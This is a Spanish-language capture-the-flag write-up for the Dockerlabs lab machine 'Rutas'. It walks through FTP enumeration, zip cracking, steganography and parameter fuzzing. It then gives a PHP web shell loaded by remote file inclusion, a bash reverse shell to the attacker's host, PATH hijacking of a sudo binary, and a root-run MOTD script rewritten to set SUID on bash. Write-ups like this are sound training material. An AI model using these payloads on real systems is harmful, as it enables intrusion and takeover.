
# Writeup Template: Maquina `[ Rutas ]`

- Tags: #Rutas
- Dificultad: `[ Media ]`
- Plataforma: `[ Dockerlabs ]`

---
## Enlace al laboratorio
[Maquina Rutas](https://mega.nz/file/4PFzgZwS#G3PmT4CFBLPJzJ7ptED9RQ7u9b5TFQcUQk0gpwzwYUk)

## Configuracion del Entorno
```bash
# Comandos para desplegar el laboratorio
7z x rutas.zip
sudo bash auto_deploy.sh rutas.tar
```

---
## Fase de Reconocimiento

### Direccion IP del Target
```bash
172.17.0.2
```
### Identificación del Target
Lanzamos una traza **ICMP** para determinar si tenemos conectividad con el target
```bash
ping -c 1 172.17.0.2 
```

### Determinacion del SO
Usamos nuestra herramienta en python para determinar ante que tipo de sistema opertivo nos estamos enfrentando
```bash
wichSystem.py 172.17.0.2
# TTL: [ 64 ] -> [ Linux ]
```

---
## Enumeracion de Puertos y Servicios
### Descubrimiento de Puertos
```bash
# Escaneo rápido con herramienta personalizada en python
escanerTCP.py -t 172.17.0.2 -p 1-65000

# Escaneo con Nmap
nmap -p- -sS --open --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts
extractPorts allPorts # Parseamos la informacion mas relevante del primer escaneo
```

### Análisis de Servicios
Realizamos un escaneo exhaustivo para determinar los servicios y las versiones que corren detreas de estos puertos
```bash
nmap -sCV -p21,22,80 172.17.0.2 -oN targeted
```

**Servicios identificados:**
```bash
21/tcp open  ftp     vsftpd 3.0.5
22/tcp open  ssh     OpenSSH 7.7p1 Ubuntu 3ubuntu13.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
```
---
## Enumeracion Servicio `FTP`
Primero enumeraremos este servicio y despues pasamos al servico principal:
```bash
nmap --script ftp-anon.nse -p 21 172.17.0.2
```

Tenemos el usuario **Anonymous** habiliado asi que podemos aprovecharnos para enuemrar este servicio:
```bash
ftp-anon: Anonymous FTP login allowed (FTP code 230)
-rw-r--r--    1 0        0               0 Jul 11  2024 hola_disfruta
-rw-r--r--    1 0        0             293 Jul 11  2024 respeta.zip
```

Verificamos los archvios con este el usuario **ananymous**:
```bash
curl ftp://172.17.0.2 --user "anonymous"
Enter host password for user 'anonymous':
-rw-r--r--    1 0        0               0 Jul 11  2024 hola_disfruta
-rw-r--r--    1 0        0             293 Jul 11  2024 respeta.zip
```

Ahora descargamos todo los recursos:
```bash
wget -r ftp://anonymous:@172.17.0.2/ 
```

Tendremos una carpeta:
```bash
.rw-rw-r-- kali kali   0 B  Thu Jul 11 00:00:00 2024  hola_disfruta
.rw-rw-r-- kali kali 293 B  Thu Jul 11 00:00:00 2024  respeta.zip
```

Si intentamos descomprimir este archivo nos pide una contrasena:
```bash
7z x respeta.zip

Enter password (will not be echoed):
```

Ahora vamos a crakearlo:
```bash
zip2john respeta.zip > hash
ver 2.0 efh 5455 efh 7875 respeta.zip/oculto.txt PKZIP Encr: TS_chk, cmplen=107, decmplen=113, crc=E9450283 ts=8E3B cs=8e3b type=8
```

Ejecutamos el ataque de fuerza **bruta**:
```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash

Press 'q' or Ctrl-C to abort, almost any other key for status
greenday         (respeta.zip/oculto.txt)
```

Ahora con la contrasena obtenida volvemos a descomprimir el archivo:
```bash
7z x respeta.zip # ( greenday )
```

Tenemos un archivo **oculto.txt** que si revisamos su contenido tenemos lo siguiente:
```bash
File: oculto.txt
──────────────────────────────────────────────────────────
Consigue la imagen crackpass.jpg
firstatack.github.io
sin fuzzing con logica y observando la sacaras ,muy rapido
```

No encontramos credenciales de acceso pero tenemos una posible imagen con contendio oculto, Si la encontramos podremos aplicar **esteganografia**, Asi que procedemos a enumerar el servicio web princiipal
En esta ruta encontraremos dicho archivo:
```bash
https://github.com/firstatack/firstatack.github.io/blob/main/assets/crackpass.jpg
```

Ahora que descargamos la imagen a nuestro equipo local tenemso lo siguiente:
```bash
steghide extract -sf crackpass.jpg
Anotar salvoconducto: 
anot� los datos extra�dos e/"passwd.zip".
```

Tenemos este archivo: **passwd.zip** que descomprimiremos:
```bash
7z x passwd.zip
```

Nos descarga un archivo **pass**
que si miramos su contenido Tenemos una posibles credenciales de acceso:
```bash
File: pass
────────────────
hackeada:denuevo
```

## Enumeracion de [Servicio Web Principal]
direccion **URL** del servicio:
```bash
http://172.17.0.2
```
### Tecnologías Detectadas
Realizamos deteccion de las tecnologias empleadas por la web
```bash
whatweb http://172.17.0.2 # No reporta nada critico
```

Lanzamos un script de **Nmap** para reconocimiento de rutas
```bash
nmap --script http-enum -p 80 172.17.0.2 # No reporta nadad critico
```
### Descubrimiento de Rutas
```bash
gobuster dir -u http://172.17.0.2 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -t 20 --add-slash
```

**Hallazgos Relevantes:**
	No reporta nada

### Descubrimiento de Archivos
```bash
gobuster dir -u http://172.17.0.2 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -t 20 -x php,php.back,backup,sh,txt,html,js,java,p
```

- **Hallazgos**:
```bash
/index.php            (Status: 200) [Size: 1116]
/index.html           (Status: 200) [Size: 10671]
```

Ingresando a la url:L
```bash
http://172.17.0.2/index.php
```

Revisando el codigo fuente tenemos estos comentarios y este codigo **HTML**
```html
<!-- Tuvimos problemas seguridad y hemos aplicado unos pocos cambios no obstante nos han vuelto a romper -->
<!-- este web developer no vale un pingo lo hace todo muy obvio -->
<aside>
    <h3>Barra lateral</h3>
    <ul>
      <li><a href="[vulndb.com](view-source:http://172.17.0.2/vulndb.com)">Enlace 1</a></li>
      <li><a href="[trackedvuln.dl/](view-source:http://172.17.0.2/trackedvuln.dl/)">Enlace 2</a></li>
      <li><a href="[dockerlabs.es](view-source:http://172.17.0.2/dockerlabs.es)">Enlace 3</a></ºli>
    </ul>
</aside>
```

Tenemos un posible dominio asi que lo agregamos a nuestro archivo: **/ect/passwd**
```bash
172.17.0.2 trackedvuln.dl
```

Una ves que ingresamos nos pide una contrasena que recordar que teniamos una de antes:
```bash
Username: hackeada
Password: denuevo
```

Ahora que tenemos esta volveremos a aplicar al archivo **index.php**:
```bash
http://trackedvuln.dl/index.php
```

Ahora para poder aplicar fuzzing de parametros sobre el archivo **index.php** tenemos que agregar la siguiente cabecera **http**
```bash
-H "Authorization: Basic aGFja2VhZGE6ZGVudWV2bw==" # hackeada:denuevo en base64
```

Verificamos si tiene parametros:
```bash
wfuzz -c -t 50 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -H "Authorization: Basic aGFja2VhZGE6ZGVudWV2bw==" -u "http://trackedvuln.dl/index.php?FUZZ=test" --hh=893
```

Ahora tenemos un parametro:
```bash
000002045:   200        39 L     104 W      1071 Ch     "love" 
```

Ahora veriricaremos si es vulnerable:
```bash
curl -s -X GET "http://trackedvuln.dl/index.php?love=../../../../etc/passwd" -H "Authorization: Basic aGFja2VhZGE6ZGVudWV2bw=="
```

Intentamos leer el archivo pero nos devuelve la siguiente respuesta desde la terminal:
```bash
<p><h1><strong>Los del SOC tenemos tus datos </strong></h1></p><p><h2>Cerca :-( pero lejos</h2></p><p><strong>Usa tmp cuando lo necesites recuerdalo te hara falta</strong></p></p
```

## Explotacion de Vulnerabilidades

### Vector de Ataque
Entonces si tenemos que apuntar a **tmp** tendremos que usar **php-filter-generator**
**Nota** Descargamos esta forma ya que no logramos ejecutar comandos de esta manera
Ahora veremos si apuntando a nuestra ip para que cargue un archivo malicioso que estara almacenado en nuestra maquina de atacante podemos ejecutar comandos:
Primero creamos el archivo malicioso: **cmd.php**
```php
<?php
  system($_GET["cmd"]);
?>
```

Montamos un servidor python para que este disponible nuestro archivo malicioso:
```bash
python3 -m http.server 80
```

### Ejecucion del Ataque
Ahora desde terminar vamos a comprobar si nos devuelve la salida del comando que intentemos ejecutar bajo el parametro **cmd**
```bash
http://trackedvuln.dl/index.php?love=http://172.17.0.1/cmd.php&cmd=id
```

```bash
Otro párrafo de ejemplo.
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
### Intrusion
Tenemos ejecucion remota de comandos, Ahora nos toca ganar acceso al objetvio
```bash
nc -nlvp 443
```

```bash
# Reverse shell o acceso inicial
http://trackedvuln.dl/index.php?love=http://172.17.0.1/cmd.php&cmd=bash -c 'exec bash -i %26>/dev/tcp/172.17.0.1/443 <%261'
```

---
## Escalada de Privilegios
### Explotacion de Privilegios

###### Usuario `[ www-data ]`:
Listando los permisos para este usuario tenemos los siguientes:
```bash
sudo -l

User www-data may run the following commands on 7d69a5078740:
    (norberto) NOPASSWD: /usr/bin/baner
```

Tenemos un bianrio **baner** que tenemos que investigar como funciona: Si listamos su contenido podemos ver lo siguiente:
```bash
sudo -u norberto /usr/bin/baner

Ejecutando 'head' con ruta absoluta:
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync

Ejecutando 'head' con ruta relativa:
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
```

Ahora sabiendo que ejcuta el binario de **head** con ruta relativa nos aprovehcamos de esto para crear un binario **head** que nos otorgue una sesion como el usuario **norberto**
En **/tmp**
```bash
touch head
```

Ahora tendra este contenido:
```bash
bash -p
```

Le damos permsios de ejecucion:
```bash
chmod +x head
```

y ahora procedemos a ejecutar de nuevo el binario:
```bash
sudo -u norberto /usr/bin/baner
```

Ahora tendremos una sesion como este usuario
```bash
# Comando para escalar al usuario: ( norberto )
Ejecutando 'head' con ruta absoluta:
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync

Ejecutando 'head' con ruta relativa:
norberto@7d69a5078740:/tmp$
```
###### Usuario `[ Norberto ]`:
Listando los demas usuarios del sistema tenemos uno mas:
```bash
cat /etc/passwd | grep "sh"

root:x:0:0:root:/root:/bin/bash
maria:x:1002:1002:,,,:/home/maria:/bin/bash
```

Ahora buscamos por archivos ocultos para este usuario y tenemos lo siguient:
```bash
find / -type f -user norberto -iname ".*" 2>/dev/null
```

Temos un archivo:
```bash
/home/norberto/.-/.miscredenciales
```

Si revisamos su contenido observamos lo siguiente:
```bash
cat .miscredenciales

Hasta aqui no sirvio mi password

⠏⠗⠁⠉⠞⠊⠉⠁⠉⠗⠑⠁⠝⠙⠕⠗⠑⠞⠕⠎

Debes tenerlo a mano te sera util
Usa mis pass para escalar
feliz hack de firstatack
```

Investigando por eso tenemos la siguiente informacion:
### **codigo Braille Unicode**.
1. **Sistema Braille**:
    - Cada símbolo (como ⠏, ⠗, etc.) representa una letra o carácter en Braille.
    - Estos caracteres están codificados en Unicode, permitiendo su visualización digital.
        
2. **Desglose del mensaje**:
    - ⠏⠗⠁⠉⠞⠊⠉⠁ → "practica"
    - ⠉⠗⠑⠁⠝⠙⠕ → "creando"
    - ⠗⠑⠞⠕⠎ → "retos"
        
3. **Significado**:
    - **"Practica creando retos"** es una frase en español que significa:  
        _"Mejora tus habilidades mediante la creación de desafíos"_.

[Braile Translator](https://www.brailletranslator.org/) Pagina online para decodificar.

Tenemos la posible contrasena de **maria** ya probando las credenciales no sirvio con ninguno, Asi que intentaremos conectarnos con **ssh** con el mismo usuario:
```bash
ssh-keygen -R 172.17.0.2 && ssh norberto@172.17.0.2 # ( practicacreandoretos )
```

Tenemos este panel de inicio:
```bash
FELIZ HACK


 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro
  _   _   _   _   _   _   _   _   _   _  
 / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ 
( F | I | R | S | T | A | T | A | C | K )
 \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ 
  _   _   _   _   _     _   _   _   _ 
 / \ / \ / \ / \ / \   / \ / \ / \ / \ 
( f | e | l | i | z ) ( h | a | c | k )
 \_/ \_/ \_/ \_/ \_/   \_/ \_/ \_/ \_/ 
Last login: Thu Jul 11 07:15:47 2024 from 172.17.0.1
```

Si listamos los grupos a los que pertenecemos:
```bash
bash-5.2$ id
uid=1001(norberto) gid=1001(norberto) euid=1002(maria) egid=1002(maria) groups=1002(maria),100(users),1001(norberto)
```

Sabiendo que tenemos como grupo a **maria** entonces tendriamos la capacidad de atravezar su directorio:
```bash
cd /home/maria/
```

Listando los archivos ocultos:
```bash
.mipass
```

Tenemos las credenciales del usuario maria:
```bash
cat .mipass 
maria:asientiendesmejor
```

Migramos al usuario **maria**
```bash
su maria # ( asientiendesmejor )
```
###### Usuario `[ Maria ]`:
Para maria tenemos que encontrar un archivo que tenga capacidad de escritura:
```bash
find / -type f -user maria -writable 2>/dev/null
```

Tenemos el siguiente que permtenece a maria:
```bash
/etc/update-motd.d/00-header
```

Si miramos su contenido:
```bash
#!/bin/sh
#
#    00-header - create the header of the MOTD
#    Copyright (C) 2009-2010 Canonical Ltd.
#
#    Authors: Dustin Kirkland <kirkland@canonical.com>
#       mos
#    This program is free software; you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation; either version 2 of the License, or
#    (at your option) any later version.
#
#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.
#
#    You should have received a copy of the GNU General Public License along
#    with this program; if not, write to the Free Software Foundation, Inc.,
#    51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.

[ -r /etc/lsb-release ] && . /etc/lsb-release

if [ -z "$DISTRIB_DESCRIPTION" ] && [ -x /usr/bin/lsb_release ]; then
        # Fall back to using the very slow lsb_release utility
        DISTRIB_DESCRIPTION=$(lsb_release -s -d)
fi
printf "SORPRESA\n"
#printf "Welcome to %s (%s %s %s)\n" "$DISTRIB_DESCRIPTION" "$(uname -o)" "$(uname -r)" "$(uname -m)"
printf "\n\nFELIZ HACK\n\n"
```

Listando los procesos del sistema:
```bash
ps -faux | grep "root"
```

Se esta ejecutando como **root**
```bash
ps -faux | grep "root"
root           1  0.0  0.0   2800  1620 ?        Ss   06:35   0:00 /bin/sh -c systemctl start vsftpd ; service ssh start && service apache2 start && tail -f /dev/null
root           9  0.0  0.0   9088  3500 ?        Ss   06:35   0:00 /usr/sbin/vsftpd /etc/vsftpd.conf
root          18  0.0  0.0  12020  4320 ?        Ss   06:35   0:00 sshd: /usr/sbin/sshd [listener] 0 of 10-100 startups
root         430  0.0  0.0  12532  7348 ?        Ss   08:47   0:00  \_ sshd: norberto [priv]
root         451  0.0  0.0   4760  3264 pts/2    S    08:51   0:00                  \_ su maria
maria        478  0.0  0.0   3956  1984 pts/2    S+   09:03   0:00                          \_ grep --color=auto root
root          36  0.0  0.1 203456 21968 ?        Ss   06:35   0:00 /usr/sbin/apache2 -k start
root         366  0.0  0.0  11424  5552 pts/0    S+   08:28   0:00  |                       \_ sudo -u norberto /usr/bin/baner
root         367  0.0  0.0  11424  1984 pts/1    Ss   08:28   0:00  |                           \_ sudo -u norberto /usr/bin/baner
root          48  0.0  0.0   2728  1432 ?        S    06:35   0:00 tail -f /dev/null
```

Ahora como este archvio nos pertenece: 
```bash
/etc/update-motd.d/00-header
```

Ahora inyectamos una instruccion maliciosoa que nos permita que se le asignen permsios **SUID** a la bash de **root**
```bash
echo "chmod u+s /bin/bash" >> /etc/update-motd.d/00-header
```

Ahora para que se ejecute tenemos que conectarnos por **ssh** con las credenciales maria:
```bash
ssh-keygen -R 172.17.0.2 && ssh maria@172.17.0.2 # ( asientiendesmejor )
```

Sabemos que se ejecuta ya que nos muestra el panel de bienvenida:
```bash
SORPRESA
FELIZ HACK


 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro
  _   _   _   _   _   _   _   _   _   _  
 / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ 
( F | I | R | S | T | A | T | A | C | K )
 \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ 
  _   _   _   _   _     _   _   _   _ 
 / \ / \ / \ / \ / \   / \ / \ / \ / \ 
( f | e | l | i | z ) ( h | a | c | k )
 \_/ \_/ \_/ \_/ \_/   \_/ \_/ \_/ \_/ 

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.
```

Ahora si listamos los permisos de la **bash**
```bash
-bash-5.2$ ls -la /bin/bash
-rwsr-xr-x 1 root root 1446024 Mar 31  2024 /bin/bash
```

Tenemos privilegios **SUID** del cual nos aprovechamos para lanzarnos una bash como **root**
```bash
bash -p
```

---

## Evidencia de Compromiso
```bash
# Captura de pantalla o output final
bash-5.2# whoami
root
```

---

## Lecciones Aprendidas
1. Aprendimos a enumerar el servicio **FTP**
2. Aprendimos a aprovecharnos del usuario **anonymous** para descargar los recursos
3. Aprendimos a ejecutar comandos **RCE** en el sistema atraves de un parametro vulnerable:
4. Aprendimos a secuestrar el  **PATH** para ejecutar codigo maliciosos atraves del bianrio **head**
5. Aprendimos a aprovecharnos de los procesos que son ejecutador por el usuario **root** para injectar codigo malicioso y que sea ejecutado como **root**